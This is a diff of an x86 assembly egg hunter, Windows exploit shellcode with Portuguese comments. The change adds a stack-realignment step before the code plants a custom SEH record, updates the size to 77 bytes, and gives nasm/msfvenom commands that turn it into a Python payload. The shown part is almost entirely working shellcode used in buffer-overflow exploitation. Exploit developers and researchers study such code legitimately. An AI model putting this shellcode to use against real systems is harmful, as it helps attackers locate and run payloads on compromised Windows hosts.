@@ -1,5 +1,8 @@
 ; Universal SEH based egg hunter (x86 and wow64)
-; Testado nos windows Vista, Windows 7 e Windows 10
+; Testado nas seguintes versões:
+;  - Windows Vista
+;  - Windows 7
+;  - Windows 10
 ;
 ; Autor: Peter Van Eeckhoutte (corelanc0d3r)
 ; Ajustes por: Helvio Junior (M4v3r1cK)
@@ -13,7 +16,7 @@
 ; nasm egghunter_w10.asm -o egghunter_w10
 ; cat egghunter_w10 | msfvenom -p - -a x86 --platform win -e generic/none -f python
 ;
-; 72 bytes egghunter
+; 77 bytes egghunter
 
 [BITS 32]
 
@@ -26,8 +29,16 @@ setup:
                                 ; da proxima instrucao (EIP) logo apos a chamada da funcao
                                 ; no nosso caso o endereco do handle
 
-    ;cria nosso registro SEH
+
+stack_align:
+                                ; Realinha a pilha de forma que o SEH que serta criado
+                                ; esteja junto com a cadeia SEH atual
     XOR EBX,EBX
+    MOV EAX, DWORD [FS:EBX]
+    PUSH EAX
+    POP ESP
+
+    ;cria nosso registro SEH
     PUSH ECX                    ; salva na pilha o local onde nosso 'custom' SE Handler estara
     PUSH ECX                    ; p/p/r vai passar por estes dados (sera ignorado)
     PUSH 0x90c3585c             ; chama o p/p/r novamente :)
@@ -43,7 +54,6 @@ setup:
                                 ; 58       POP EAX
                                 ; EB 04    JMP SHORT 0x06
     MOV DWORD [FS:EBX],ESP      ; Coloca nosso SEH no topo da cadeia SEH
-
 
     JMP loop_inc_page           ; Salta para o ponto de inclusao de pagina
 
